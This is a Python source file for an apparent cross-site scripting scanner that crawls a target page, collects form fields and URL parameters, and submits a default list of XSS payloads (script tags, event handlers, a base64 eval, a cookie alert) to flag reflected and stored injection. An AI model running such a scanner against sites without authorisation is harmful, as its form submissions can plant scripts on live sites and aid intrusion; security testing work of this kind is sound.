import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import re

class XSScanner:
    def __init__(self, url, args):
        self.url = url
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'
        })
        
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        if args.cookies:
            self.session.cookies.update({'session': args.cookies})
        
        self.payloads = self.load_payloads()
        self.results = []
    
    def load_payloads(self):
        """Load XSS payloads from file or use defaults"""
        payload_file = 'payloads/xss.txt'
        try:
            with open(payload_file, 'r') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except FileNotFoundError:
            # Default payloads
            return [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "\"><script>alert(1)</script>",
                "'><svg onload=alert(1)>",
                "<script>alert(document.cookie)</script>",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                "<ScRiPt>alert(1)</ScRiPt>",
                "\" autofocus onfocus=alert(1) x=\"",
                "';alert(1);//",
                "</script><script>alert(1)</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk'))>",
                "<details open ontoggle=alert(1)>"
            ]
    
    def extract_forms(self, html, base_url):
        """Extract all forms from HTML"""
        soup = BeautifulSoup(html, 'html.parser')
        forms = []
        
        for form in soup.find_all('form'):
            action = form.get('action', '')
            if not action or action == '#':
                action = base_url
            else:
                action = urljoin(base_url, action)
            
            method = form.get('method', 'get').lower()
            inputs = []
            
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name')
                if name:
                    input_type = input_tag.get('type', 'text')
                    if input_type not in ['submit', 'button', 'image', 'hidden']:
                        inputs.append(name)
            
            forms.append({
                'action': action,
                'method': method,
                'inputs': inputs
            })
        
        return forms
    
    def extract_url_params(self):
        """Extract URL parameters"""
        parsed = urlparse(self.url)
        params = []
        if parsed.query:
            for param in parsed.query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
        return params
    
    def test_reflected_xss(self, url, params, payload):
        """Test for reflected XSS in a single request"""
        try:
            test_params = {}
            for param in params:
                test_params[param] = payload
            
            response = self.session.get(url, params=test_params, 
                                      timeout=self.args.timeout)
            
            # Check if payload is reflected in the response
            if payload in response.text or payload.replace('<', '&lt;') in response.text:
                return {
                    'url': url,
                    'param': ', '.join(params),
                    'payload': payload,
                    'type': 'Reflected XSS',
                    'evidence': payload[:100]
                }
        except Exception as e:
            pass
        return None
    
    def test_stored_xss(self, form, payload, base_url):
        """Test for stored XSS via form submission"""
        try:
            data = {}
            for inp in form['inputs']:
                data[inp] = payload
            
            if form['method'] == 'post':
                response = self.session.post(form['action'], data=data,
                                           timeout=self.args.timeout)
                # Check if payload appears somewhere on the site (stored)
                # Simple check: visit the original page again
                check_response = self.session.get(base_url, timeout=self.args.timeout)
                if payload in check_response.text:
                    return {
                        'url': form['action'],
                        'payload': payload,
                        'type': 'Stored XSS (Potential)',
                        'evidence': payload[:100]
                    }
        except Exception:
            pass
        return None
    
    def scan(self):
        """Main scan function"""
        print("    [*] Crawling target for forms and parameters...")
        
        try:
            response = self.session.get(self.url, timeout=self.args.timeout)
        except Exception as e:
            print(f"    [!] Error fetching target: {e}")
            return []
        
        # Get forms
        forms = self.extract_forms(response.text, self.url)
        print(f"    [*] Found {len(forms)} forms")
        
        # Get URL parameters
        url_params = self.extract_url_params()
        if url_params:
            print(f"    [*] Found URL parameters: {', '.join(url_params)}")
        
        all_params = url_params
        all_targets = []
        
        # Add form inputs as targets
        for form in forms:
            for inp in form['inputs']:
                all_params.append(inp)
                all_targets.append({
                    'type': 'form',
                    'form': form,
                    'url': form['action']
                })
        
        all_params = list(set(all_params))
        
        if not all_params:
            print("    [!] No input vectors found. Cannot test XSS.")
            return []
        
        print(f"    [*] Testing {len(self.payloads)} XSS payloads on {len(all_params)} parameters...")
        
        # Test reflected XSS in URL parameters
        if url_params:
            for payload in self.payloads:
                result = self.test_reflected_xss(self.url, url_params, payload)
                if result:
                    self.results.append(result)
                    print(f"    [!] XSS Found! Payload: {payload[:50]}")
        
        # Test forms
        for target in all_targets:
            if target['type'] == 'form':
                for payload in self.payloads:
                    result = self.test_stored_xss(target['form'], payload, self.url)
                    if result:
                        self.results.append(result)
                        print(f"    [!] Potential Stored XSS! Payload: {payload[:50]}")
        
        return self.results